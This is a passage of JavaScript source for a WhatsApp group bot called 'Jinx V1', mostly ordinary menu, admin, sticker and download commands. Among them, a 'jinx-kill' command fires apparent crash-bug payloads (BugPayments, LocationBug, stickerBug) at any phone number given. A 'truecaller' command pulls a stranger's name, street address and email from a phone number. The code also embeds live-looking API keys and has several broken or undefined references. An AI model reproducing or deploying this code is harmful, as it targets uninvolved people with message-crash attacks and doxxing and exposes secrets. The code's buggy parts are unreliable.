thumbnail: ``,
mediaType: 4,
MediaUrl:``,
sourceUrl:``,
}}
};

}

}
break */

case 'ownermenu':{
await loadings()
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let nesy = ` 
   🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
  ━━━━━━━━━━━━━━━━
  ▣ ${ucapanWaktu} 
 
  ◉ ${m.pushName}
  ━━━━━━━━━━━━━━━━
 ┏━━━━━━━━━━━━━━━━━◈
 ┃ ➢ 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
 ┃ ➣ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
 ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
 ┗━━━━━━━━━━━━━━━━━◈
 ┏━━━━━━━━━━━━━━━━━◈
 ┃ ✰ 𝐩𝐮𝐛𝐥𝐢𝐜
 ┃ ✰ 𝐬𝐞𝐥𝐟
 ┃ ✰ 𝐛𝐥𝐨𝐜𝐤
 ┃ ✰ 𝐮𝐧𝐛𝐥𝐨𝐜𝐤
 ┃ ✰ 𝐥𝐢𝐬𝐭𝐛𝐥𝐨𝐜𝐤
 ┗━━━━━━━━━━━━━━━━━◈
> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024 
> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
sam.sendMessage(m.chat, { 
	           text: nesy,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝐉𝐈𝐍𝐗`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
case 'jinx-downloads':{
await loadings()
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let nesy = ` 
   🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
  ━━━━━━━━━━━━━━━━
  ▣ ${ucapanWaktu} 
 
  ◉ ${m.pushName}
  ━━━━━━━━━━━━━━━━
 ┏━━━━━━━━━━━━━━━━━◈
 ┃ ➢ 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
 ┃ ➣ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
 ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
 ┗━━━━━━━━━━━━━━━━━◈
 ┏━━━━━━━━━━━━━━━━━◈
 ┃ ✰ 𝐩𝐥𝐚𝐲
 ┃ ✰ 𝐲𝐭𝐦𝐩3
 ┃ ✰ 𝐲𝐭𝐦𝐩4
 ┃ ✰ 𝐦𝐞𝐝𝐢𝐚𝐟𝐢𝐫𝐞
 ┃ ✰ 𝐢𝐠
 ┃ ✰ 𝐠𝐢𝐭𝐜𝐥𝐨𝐧𝐞
 ┗━━━━━━━━━━━━━━━━━◈
"> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024",
> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
sam.sendMessage(m.chat, { 
	           text: nesy,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝐉𝐈𝐍𝐗`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
 case 'genius-jinx':{
await loadings()
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let kesy = ` 
   🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
  ━━━━━━━━━━━━━━━━
  ▣ ${ucapanWaktu} 
 
  ◉ ${m.pushName}
  ━━━━━━━━━━━━━━━━
 ┏━━━━━━━━━━━━━━━━━◈
 ┃ ➢ 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
 ┃ ➣ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
 ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
 ┗━━━━━━━━━━━━━━━━━◈
 ┏━━━━━━━━━━━━━━━━━◈
 ┃ ✰ 𝐣𝐢𝐧𝐱-𝐚𝐢
 ┃ ✰ 𝐛𝐫𝐚𝐢𝐧-𝐚𝐢
 ┃ ✰ 𝐚𝐢
 ┃ ✰ 𝐚𝐥𝐞𝐱𝐚
 ┗━━━━━━━━━━━━━━━━━◈
"> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024",
> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
sam.sendMessage(m.chat, { 
	           text: kesy,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝐉𝐈𝐍𝐗`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
  case 'jinx-convert':{
await loadings()
let timestamp = speed()
let latensi = speed() - timestamp
let run = runtime(process.uptime())
let pesy = ` 
   🦄 𝗝𝗜𝗡𝗫━𝗩1 🦄
  ━━━━━━━━━━━━━━━━
  ▣ ${ucapanWaktu} 
 
  ◉ ${m.pushName}
  ━━━━━━━━━━━━━━━━
 ┏━━━━━━━━━━━━━━━━━◈
 ┃ ➢ 𝐏𝐫𝐞𝐟𝐢𝐱 : ${prefix}
 ┃ ➣ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)}
 ┃ ➣ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${run}
 ┗━━━━━━━━━━━━━━━━━◈
 ┏━━━━━━━━━━━━━━━━━◈
 ┃ ✰ 𝐜𝐚𝐥𝐜
 ┃ ✰ 𝐫𝐞𝐦𝐢𝐧𝐢
 ┃ ✰ 𝐫𝐦𝐛𝐠
 ┃ ✰ 𝐬𝐡𝐨𝐮𝐫𝐭𝐮𝐫𝐥
 ┃ ✰ 𝐬𝐭𝐢𝐜𝐤𝐞𝐫
 ┃ ✰ 𝐬𝐦𝐞𝐦𝐞
 ┃ ✰ 𝐭𝐞𝐱𝐭𝐦𝐚𝐤𝐞𝐫
 ┃ ✰ 𝐬𝐭𝐭
 ┃ ✰ 𝐭𝐨𝐢𝐦𝐚𝐠𝐞
 ┃ ✰ 𝐭𝐨𝐚𝐮𝐝𝐢𝐨
 ┃ ✰ 𝐭𝐭𝐩
 ┃ ✰ 𝐭𝐨𝐪𝐫
 ┃ ✰ 𝐭𝐭𝐬
 ┗━━━━━━━━━━━━━━━━━◈
> 𝐉𝐢𝐧𝐱 𝐰𝐚𝐬 𝐢𝐧𝐯𝐞𝐧𝐭𝐞𝐝 ® 2024 
> 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`
sam.sendMessage(m.chat, { 
	           text: pesy,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝐉𝐈𝐍𝐗`,
                            body: `𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,
                            thumbnailUrl: `https://telegra.ph/file/d945b02dab1726a2bc763.jpg`, 
                            sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                    })
                    }
                 break
//======================================//
case "ping": case "speed": { 
let timestamp = speed()
let latensi = speed() - timestamp

         m.reply (`\n\━━━━━━━━━━━━━━━━━\n\✫ ${ucapanWaktu}\n\━━━━━━━━━━━━━━━━━\n\◉ ${m.pushName}\n\━━━━━━━━━━━━━━━━━\n\◈ 𝐉𝐢𝐧𝐱 𝐒𝐩𝐞𝐞𝐝 : ${latensi.toFixed(4)} 𝐌𝐒\n\━━━━━━━━━━━━━━━━━`); 
         } 
 break; 
//=====≠==================================//
case "jinx": { 
  
 sam.sendMessage(m.chat, { video: { url: 'https://telegra.ph/file/615f4fe0243119de98dad.mp4' }, caption: `🦋${ucapanWaktu} \n🦄 𝐇𝐞𝐥𝐥𝐨 *${m.pushName}*, \n🦄 𝐈𝐭 𝐢𝐬 𝐦𝐞 𝐉𝐢𝐧𝐱\n🦄 𝐒𝐞𝐫𝐯𝐢𝐧𝐠 𝐚𝐭 𝐦𝐲 𝐛𝐞𝐬𝐭 \n🦄 𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐛𝐲 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒`,fileLength: "9999999999898989899999999" }, { quoted: m });
 }
break;
//========================================//
case 'public': {
if (!isDeveloper) return
sam.public = true
await reaction(m.chat, "💫")
}
break
case 'self': {
if (!isDeveloper) return
sam.public = false
await reaction(m.chat, "💫")
}
break
case 'block': {
if (!isDeveloper) return
await reaction(m.chat, "🔥")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'; /**/ users = users || m.chat
if (users.includes('@g.us')) return xreply("Loh, @g.us ? 🧐")
await sam.updateBlockStatus(users, 'block').then((res) => xreply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
await reaction(m.chat, "✅")
}
break
case 'unblock':
if (!isDeveloper) return
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if(isGroup){
if(users){
await sam.updateBlockStatus(users, "unblock")
await reply(`Succeful unblocked user`)
} else if(!q){
reply("Reply to targets text 🦄")
}
} else if(!isGroup){
if(q){
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("07")) return xreply("Start the number with 254")
if(!woke.startsWith("254")) return xreply("Please reply to the message or tag or enter the number you want to blockk")
await sam.updateBlockStatus(woke, "unblock")
reply(`Succes unblocked ${woke}`)
} else if(!q){
reply("Enter the number you want to unblock")
}

}
break
case 'listblock':{
let block = await sam.fetchBlocklist()
reply('✫ 𝐉𝐈𝐍𝐗 𝐁𝐋𝐎𝐂𝐊𝐄𝐃 𝐂𝐎𝐍𝐓𝐀𝐂𝐓𝐒 ⦾ :\n\n' + `➤𝐓𝐨𝐭𝐚𝐥 : ${block == undefined ? '➵ 𝐁𝐥𝐨𝐜𝐤𝐞𝐝' : '*' + block.length + '* 𝐅𝐮𝐜𝐤 𝐘𝐨𝐮 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐂𝐨𝐧𝐭𝐚𝐜𝐭𝐬'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`)
}
break
//=================================================//
case 'swm': case 'steal': case 'stickerwm': case 'take': {
                if (!args.join(" ")) return reply(`Where is the text?`)
                const swn = args.join(" ")
                const pcknm = swn.split("|")[0]
                const atnm = swn.split("|")[1]
                if (m.quoted.isAnimated === true) {
                    sam.downloadAndSaveMediaMessage(quoted, "gifee")
                    sam.sendMessage(from, { sticker: fs.readFileSync("gifee.webp") }, { quoted: m })
                } else if (/image/.test(mime)) {
                    let media = await quoted.download()
                    let encmedia = await sam.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
                    let media = await quoted.download()
                    let encmedia = await sam.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
                } else {
                    reply(`Photo/Video?`)
                }
            }
                break
//=================================================//
case 'setppbot':{
if (!isDeveloper) return
await reaction(m.chat, "✨")
if(m.quoted){
const media = await sam.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await sam.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
await reply(`${mess.success}`)
await reaction(m.chat, "🦄")
} else reply("Reply photo")
}
break
//=================================================//
case 'delppbot': {
if (!isDeveloper) return
sam.removeProfilePicture(sam.user.id)
reply(mess.succes)
}
break
//=================================================//
case 'setbiobot':{
if (!isDeveloper) return
if (!q) return reply(`Send commands ${prefix+command} name\n\nuse : ${command} jinx`)
await sam.updateProfileStatus(q)
await reply(`Please increase your status bio ke *${q}*`)
}
break
//=================================================//
case 'leavegc':{
if (!isDeveloper) return
if (!isGroup) return
await sam.groupLeave(m.chat)
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isDeveloper) return reply(mess.usingsetpp)
if (!isGroup) return reply(mess.ingroup)
await reaction(m.chat, "✨")
if (!isAdmins) return reply(mess.admin)
if (!/image/.test(mime)) return reply(`Reply Image with Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Reply Image with  Caption ${prefix + command}`)
let media = await sam.downloadAndSaveMediaMessage(m)
await sam.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
reply('done')
await reaction(m.chat, "🦄")}
break
//=================================================//
case 'editsubject': {
if (!isGroup) return reply(mess.ingroup)
if (!isBotAdmins) return reply(mess.notadmin)
if (!q) return reply(`Example *${prefix + command} new*`);
await reaction(m.chat, "🫥")
await sam.groupUpdateSubject(m.chat, text)
await reaction(m.chat, "✨")}
break
//=================================================//
case 'editdesc': {
if (!isGroup) return reply(mess.ingroup)
if (!isBotAdmins) return reply(mess.notadmin)
if (!q) return reply(`Example *${prefix + command} king*`);
await reaction(m.chat, "✨")
await sam.groupUpdateDescription(m.chat, text)
await reaction(m.chat, "🦄")}
break
//=================================================//
case 'antilink': case 'linkgc': {
if (!isGroup) return reply(mess.ingroup)
if (!isBotAdmins) return reply(mess.notadmin)
await reaction(m.chat, "✨")
let response = await sam.groupInviteCode(m.chat)
sam.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
 await reaction(m.chat, "🦄")}
break
//=================================================//
case 'resetlinkgc': case 'revoke': {
if (!isGroup) return reply(mess.ingroup)
if (!isBotAdmins) return reply(mess.notadmin)
await reaction(m.chat, "✨")
sam.groupRevokeInvite(m.chat)
 await reaction(m.chat, "🦄")}
break
//=================================================//
case 'invite': {
if (!isGroup) return reply(mess.ingroup)
if (!isBotAdmins) return reply(mess.notadmin)
await reaction(m.chat, "✨")
let response = await sam.groupInviteCode(m.chat)
reply(`https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`)
await reaction(m.chat, "🦄")}
break
//=================================================//
case 'kick': {
if (!isGroup) return reply(mess.ingroup)
if (!isBotAdmins) return reply(mess.notadmin)
if (!isAdmins) return reply(mess.admin)
await reaction(m.chat, "✨")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sam.groupParticipantsUpdate(m.chat, [users], 'remove')
reply(mess.done)
 await reaction(m.chat, "🦄")}
break
//=================================================//
case 'add': {
if (!isGroup) return reply(mess.ingroup)
if (!isBotAdmins) return reply(mess.notadmin)
if (!isAdmins) return reply(mess.admin)
await reaction(m.chat, "✨")
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sam.groupParticipantsUpdate(m.chat, [users], 'add')
reply(mess.done)
 await reaction(m.chat, "🦄")}
break
//=================================================//
case 'promote': {
if (!isGroup) return reply(mess.ingroup)
if (!isBotAdmins) return reply(mess.notadmin)
if (!isAdmins) return reply(mess.admin)
await reaction(m.chat, "✨")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sam.groupParticipantsUpdate(m.chat, [users], 'promote')
reply(mess.done)
 await reaction(m.chat, "🦄")}
break
//=================================================//
case 'demote': {
if (!isGroup) return reply(mess.ingroup)
if (!isBotAdmins) return reply(mess.notadmin)
if (!isAdmins) return reply(mess.admin)
await reaction(m.chat, "✨")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sam.groupParticipantsUpdate(m.chat, [users], 'demote')
reply(mess.done)
 await reaction(m.chat, "🦄")}
break
//=================================================//
case 'hidetag': {
if (!isGroup) return reply(mess.ingroup)
if (!isBotAdmins) return reply(mess.notadmin)
if (!isAdmins) return reply(mess.admin)
await reaction(m.chat, "✨")
sam.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:m})
 await reaction(m.chat, "🦄")}
break
//=================================================//
case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `🦄 *LIST OF PERSONAL CHATS*\n\nTotal Chat : ${anu.length} Chats\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `🚫 *Name :* ${nama}\n🫥 *User :* @${i.split('@')[0]}\n🦄 *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 sam.sendTextWithMentions(m.chat, teks, m)
             }
             break;

case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                let teks = `⬣ *LIST OF GROUP CHATS*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await sam.groupMetadata(i)
                     teks += `🦄 *Name :* ${metadata.subject}\n🦄 *Owner :* @${metadata.owner.split('@')[0]}\n⬡ *ID :* ${metadata.id}\n🫥 *Created on :* ${moment(metadata.creation * 1000).tz('Africa/Nairobi').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Members :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 sam.sendTextWithMentions(m.chat, teks, m)
             }
             break;
case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    sam.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break;
case 'true':
case 'truecaller':
  try {
    if (!text) {
      // Reply when no phone number is provided
    return  reply ('Please provide a phone number.');
      break;
    }

    const installationId = 'a1i0g--k3toNiVP-9swCenahQhhokTiqfXRFw2LossLOsZLDh3P-fLD0b75S8iF7';
    const apiUrl = `https://sid-bhai.vercel.app/api/truecaller?phone=${encodeURIComponent(text)}&id=${installationId}`;

    let response = await axios.get(apiUrl);
    console.log(response);
    let json = response.data;

    const { name, alternateName, addresses, email, countryDetails } = json;

    let info = `╭––『 *Phone Detail* 』\n`;
    info += `┆ ⚝ *Name:* ${name}\n`;

    if (addresses && addresses.length > 0) {
      info += `┆ ⚝ *Address:* ${addresses[0].city}, ${addresses[0].countryCode}\n`;
      info += `┆ ⚝ *Time Zone:* ${addresses[0].timeZone}\n`;
      info += `┆ ⚝ *Pin Code* ${addresses[0].zipCode}\n`;
      info += `┆ ⚝ *Street* ${addresses[0].street}\n`;
    }

    info += `┆ ⚝ *Email:* ${email}\n`;
    info += `╰–––––––––––––––༓\n`;

    if (countryDetails) {
      info += `╭––『 *countryDetails* 』\n`;
      info += `┆ ⚝ *Name:* ${countryDetails.name}\n`;
      info += `┆ ⚝ *Native:* ${countryDetails.native}\n`;
      info += `┆ ⚝ *Phone Code:* +${countryDetails.phone[0]}\n`;
      info += `┆ ⚝ *Continent:* ${countryDetails.continent}\n`;
      info += `┆ ⚝ *Capital:* ${countryDetails.capital}\n`;
      info += `┆ ⚝ *Currency:* ${countryDetails.currency.join(', ')}\n`;
      info += `┆ ⚝ *Languages:* ${countryDetails.languages.join(', ')}\n`;
      info += `┆ ⚝ *Flag:* ${countryDetails.flag}\n`;
      info += `╰–––––––––––––––༓
                *By Jinx V1* `;
    }

    await sam.sendMessage(m.chat, {
      text: info,
    }, {
      quoted: m,
    });

  } catch (error) {
    console.error(error);
  }
  break;
case 'subfinder': {
 /*if (!Owner) return reply('Mohon maaf, hanya pembuat yang dapat menggunakan perintah ini.')*/
  if (!q) return reply('Name of the domain ? .')
  await loading()
  let feta = await fetchJson(`https://api.caliph.biz.id/api/scan/subdomain?host=${q}&apikey=fZ69bJCk`);
  if (!feta.status) return reply('Please wait') 
  
  let list = '*List Subdomain*\n\n'
  for (let L of feta.result) {
    list += `Name: ${L.domain}\nDNS: ${L.dns}\nProxy: ${L.cf_proxy ? "✅" : "❌"}\n\n`
  }
  
  sam.sendMessage(from, { text: list.trim() }, { quoted: m })
  } 
  break;
case'voiceai' : {
if (!Developer) return reply(`You are not my owner`)
if (!q) return reply('Your request?')
getBuffer("https://api.yanzbotz.my.id/api/ai/gptvoice?query=" + q ).then( a => {
sam.sendMessage(from, { audio: a, mimetype: 'audio/mp4', ptt: true}, {quoted:m})        
})
}
break;
//===============================================°=//
case 'tourl': {
                reply(mess.wait)
                let media = await sam.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    reply(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
                break
case 'apk':
case 'apkdl':{
if (!text) return reply("What apk u wanna download?")
let resMaria = await fetch(`https://vihangayt.me/download/apk?id=${text}`)
let jsonMaria = await resMaria.json()
sam.sendMessage(from, { document: { url: jsonMaria.data.dllink}, fileName : jsonMaria.data.name, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
.catch(console.error)
}
break;
case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return reply(`Example : ${prefix + command} ðŸ˜…+ðŸ¤”`)
                if (!emoji2) return reply(`Example : ${prefix + command} ðŸ˜…+ðŸ¤”`)
                reply(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
                break
	case 'jinx-kill':{
                if (!isPremium) return reply(mess.prem)
                if (!q) return reply(`Example : ${prefix + command} 254xxxxxxx`)
                let number = q.replace(/[^0-9]/g, '');
                if (number.startsWith('0')) return reply(`Example : ${prefix + command} 254781xxxxxxx`)
                let target = number + '@s.whatsapp.net';
                await reply("Jinx is  processing 🦄..")
                for (let i = 0; i < 1; i++) {
                    await BugPayments(target)
                    await LocationBug(target)
                    await ButtonWithImageBug(target)
                    await LocationBug(target)
                    await stickerBug(target)
                    await LocationBug(target)
                }
            }
                break
	case 'welcome': {
if (/on/.test(text)) {
 if (global.welcome) {
   m.reply("Already activated");
 } else {
 global.welcome = true;
m.reply("Activated welcome message");
}
} else if (/off/.test(text)) {
if (!global.welcome) {
   m.reply("Already deactivated");
 } else {
 global.welcome = false;
m.reply("Deactivated welcome message");
}
} else m.reply(`Type ${prefix+command} on|off`);
}
break;  
case 'vv':
            case 'toviewonce': {
                if (!quoted) return reply(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await sam.downloadAndSaveMediaMessage(quoted)
                    sam.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: `Magic from Jinx ✨`,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await sam.downloadAndSaveMediaMessage(quoted)
                    sam.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: `Here you go!`,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                }
            }
                break
case 'broadcast': case 'bcimage': case 'broadcastvideo': case 'broadcastvid':
if(!Developer) throw NotOwner;
        if (!q) return reply(`Enter text`)
        let getGroups = await sam.groupFetchAllParticipating()
        let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
        let xeoncast = groups.map(v => v.id)
        reply(` Broadcasting in ${xeoncast.length} Group Chat, in ${xeoncast.length * 1.5} seconds`)
        for (let i of xeoncast) {
let txt = `${ownername}'s Broadcast\n\nMessage : ${q}`
if(/image/.test(mime)) {
let media = await quoted.download()
await sam.sendMessage(i, { image:media,  caption: txt,mentions:participants.map(a => a.id) })
}
if(/video/.test(mime)){
let media = await quoted.download()
await sam.sendMessage(i, { video:media,  caption: txt, mentions:participants.map(a => a.id) })
}
            }
        reply(`Successfuly Broadcasted in ${xeoncast.length} Groups`)      
        break;
case 'tovv': case 'toviewonce': { 
if (!quoted) return reply(`Reply Image/Video`)
if (/image/.test(mime)) {
anuan = await client.downloadAndSaveMediaMessage(quoted)
sam.sendMessage(m.chat, {image: {url:anuan}, caption: `Here you go!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await sam.downloadAndSaveMediaMessage(quoted)
sam.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Here you go!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break;
case 'snapshotfull': case 'ssf':
  try {
    if (!text) return reply("```Uhh Please, Give me Url!```");
    let urll = `https://image.thum.io/get/fullpage/=${text.match(/\bhttps?:\/\/\S+/gi)[0]}`
    let media = await getBuffer(urll)
    return await sam.sendMessage(m.chat, { image: media }, { quoted: m });
  } catch (err) {
    return reply("```Error While Fetching Snapshot```");
  }
  break;
case 'fliptext': {
                if (args.length < 1) return reply(`Example:\n${prefix}fliptext Sam`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                reply(`\`\`\`FLIP TEXT \`\`\`\n*> Normal :*\n${quere}\n> Flip :*\n${flipe}`)
            }
                break
case 'google': {
sam.sendMessage(from, { react: { text: "🔎", key: m.key }}) 
if (!q) return reply(`Example : ${prefix + command} Who is Kresswell`)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `「🏮 *Google Search Engine*🏮」 \n\n
`
for (let g of res) {
teks += `🧧 *Title* : ${g.title}\n`
teks += `🔮 *Description* : ${g.snippet}\n`
teks += `📎 *Link* : ${g.link}\n\n────────────────────\n\n`
} 
reply(teks)
})
}
break;
case "couple":
        {
          if (!m.isGroup) return reply('Use this in a group');
          let member = participants.map((u) => u.id);
          let orang = member[Math.floor(Math.random() * member.length)];
          let jodoh = member[Math.floor(Math.random() * member.length)];
          sam.sendMessage(
            m.chat,
            {
              text: `@${orang.split("@")[0]} ❤️ @${jodoh.split("@")[0]}
Cieeee, What's Going On❤️💖👀`,
              contextInfo: {
                mentionedJid: [orang, jodoh],
                forwardingScore: 9999999,
                isForwarded: true,
                externalAdReply: {
                  showAdAttribution: true,
                  containsAutoReply: true,
                  title: ` Jinx V1 `,
                  body: `Just for fun`,
                  previewType: "PHOTO",
                  thumbnailUrl: ``,
                  thumbnail: fs.readFileSync(
                    `./derived/jinx.jpg`
                  ),
                  sourceUrl: `https://whatsapp.com/channel/0029VaaqaSp0LKZDuwe5SI3e`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
case 'nsfw':
                if (!m.isGroup) return reply('this feature is only for groups')
                        if (!Developer && !isAdmin) return reply('only admin can use this feature')
                                        if (args.length < 1) return reply(`to activate type : ${prefix}nsfw 1`)
                                        if (Number(args[0]) === 1) {
                                                if (isNsfw) return reply('Already Activated')
                                                nsfw.push(from)
                                                fs.writeFileSync('./derived/nsfw.json', JSON.stringify(nsfw))
                                                reply('Successfully activated the nsfw feature')
                                                sam.sendMessage(from, `Free to use xnxxsearch 🗿`, text)
                                        } else if (Number(args[0]) === 0) {
                                                if (!isNsfw) return reply('Its off')
                                                var ini = nsfw.indexOf(from)
                                                nsfw.splice(ini, 1)
                                                fs.writeFileSync('./derived/nsfw.json', JSON.stringify(nsfw))
                                                reply('Successfully disabled the nsfw feature')
                                        } else {
                                                reply('1 to turn on, 0 to turn off')
                                        }
                                        break;
case "antilink": case "link": { 
                 if (!m.isGroup) throw group; 
                 if (!isBotAdmin) throw botAdmin; 
                 let response = await sam.groupInviteCode(m.chat); 
                 sam.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject}`, m, { detectLink: true }); 
             } 
 break;
case "lyrics": 
 try { 
//if (!isPrem) return reply('This is a premium command')
 if (!text) return reply("Provide a song name!"); 
 const searches = await sam.songs.search(text); 
 const firstSong = searches[0]; 
 //await client.sendMessage(from, {text: firstSong}); 
 const lyrics = await firstSong.lyrics(); 
 await sam.sendMessage(from, { text: lyrics}, { quoted: m }); 
 } catch (error) { 
             reply(`I did not find any lyrics for ${text}. Try searching a different song.`); 
             console.log(error); 
         } 
 //const artist = await Client.artists.get(456537); 
